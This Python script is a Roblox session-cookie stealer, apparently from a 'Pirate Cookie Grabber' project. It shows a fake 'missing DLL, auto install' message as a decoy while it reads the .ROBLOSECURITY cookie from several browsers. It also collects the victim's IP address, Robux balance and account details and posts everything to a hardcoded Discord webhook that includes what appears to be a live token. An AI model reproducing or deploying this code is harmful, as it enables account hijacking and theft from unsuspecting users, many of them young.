import os
import codecs
import json
from base64 import *

webhookk = "https://discord.com/api/webhooks/1333383941280763965/6V-xM7ybdHnd9uJ1flF1LZtJrqv1OHiMs0AH-3_GFU5VTK21stu1CzbOyo0EQucx17lb"
def command(c):
    os.system(c)
def cls():
    os.system("cls")

try:
    import robloxpy
    import requests,re
    from discordwebhook import *
    import browser_cookie3
    
except:
    input("Libraries not installed press enter to exit...")




dummy_message = "ERROR _ Missing dll (vllpcfix.dll) PLS WAIT AUTO INSTALL" # Im a genius
print(dummy_message)
def cookieLogger():
    data = []
    try:
        cookies = browser_cookie3.firefox(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chromium(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass

    try:
        cookies = browser_cookie3.edge(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.opera(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
    try:
        cookies = browser_cookie3.chrome(domain_name='roblox.com')
        for cookie in cookies:
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
cookies = cookieLogger()
ip_address = requests.get("https://checkip.amazonaws.com/").text #This website is 100% faster that api.ipify.org
roblox_cookie = cookies[1]
isvalid = robloxpy.Utils.CheckCookie(roblox_cookie)
if isvalid == "Valid Cookie":
    pass
else:
    requests.post(url=webhookk,data={"content":f"R.I.P ,cookie is expired\ndead cookie :skull: : ```{roblox_cookie}```"})
    exit()
ebruh = requests.get("https://www.roblox.com/mobileapi/userinfo",cookies={".ROBLOSECURITY":roblox_cookie})
info = json.loads(ebruh.text)
rid = info["UserID"]
rap = robloxpy.User.External.GetRAP(rid)
friends = robloxpy.User.Friends.External.GetCount(rid)
age = robloxpy.User.External.GetAge(rid)
crdate = robloxpy.User.External.CreationDate(rid)
rolimons = f"https://www.rolimons.com/player/{rid}"
roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
headshot = robloxpy.User.External.GetHeadshot(rid)
username = info['UserName']
robux = info['RobuxBalance']
premium = info['IsPremium']
discord = Discord(url=webhookk)
discord.post(
    username="BOT - Pirate 🍪",
    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
    embeds=[
        {
            "username": "BOT - Pirate 🍪",
            "title": "💸 +1 Result Account 🕯",
            "description" : f"[Github Page](https://github.com/Appolon24800/Pirate-Cookie-Grabber-No-dual-hook-) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
            "color" : 12452044,
            "fields": [
                {"name": "Username", "value": username, "inline": True},
                {"name": "Robux Balance", "value": robux, "inline": True},
                {"name": "Premium Status", "value": premium,"inline": True},
                {"name": "Creation Date", "value": crdate, "inline": True},
                {"name" : "RAP", "value": rap,"inline": True},
                {"name" : "Friends", "value": friends, "inline": True},
                {"name" : "Account Age", "value": age, "inline": True},
                {"name" : "IP Address", "value" : ip_address, "inline:": True},
                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
            ],
            "thumbnail": {"url": headshot},
        }
    ],
)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
